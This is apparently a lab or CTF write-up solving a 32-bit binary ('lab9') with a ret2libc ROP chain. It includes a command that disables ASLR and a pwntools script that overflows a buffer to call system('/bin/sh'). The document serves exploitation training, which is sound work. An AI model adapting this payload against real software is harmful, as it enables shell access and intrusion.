# Lab-9
Lab 9 Pwn ROPchain / ret2shellcode solution

#### Check the binary protections

![image](https://github.com/user-attachments/assets/7a9f4329-53ea-4563-86cf-22f2c5ac274e)

#### Check the architechture Type

![image](https://github.com/user-attachments/assets/8b3406d1-8db0-4942-a550-373f0727282f)


### Solution 1 : ROP Way

**Turn Off ASLR**

```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

![image](https://github.com/user-attachments/assets/d9fff15f-fd0b-4a6f-95eb-927b2071d71e)


**Leak Libc Base**
![image](https://github.com/user-attachments/assets/47b611e2-a27d-4139-a2fa-ccf25b80deca)


![image](https://github.com/user-attachments/assets/e6e89228-aeed-4f36-be61-ad313cb45100)

so our libc base address we got is : `0xf7d8b000`

we will use system function in the lab9 binary present to call '/bin/sh' from libc as addresses are static wont be an issue

```py
import sys
from pwn import *

context.log_level = 'CRITICAL'
context.arch = 'i386'

binary = ELF("lab9")
libc = ELF("/usr/lib32/libc.so.6")

libc_base = 0xf7d8b000
system_addr = libc_base + libc.symbols['system']

rop = ROP(binary)


bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))
rop.call(system_addr, [bin_sh_addr])

padding = b"a" * 22
exploit = rop.chain()
payload = padding + exploit + b"bbbb"  # 4 extra b's for padding adjustment here
sys.stdout.buffer.write(payload)
```

### Run it

```bash
./lab9 $(python3 solve.py)
```

![image](https://github.com/user-attachments/assets/c8763b16-1a49-4f4b-a91e-a45ed31398c7)
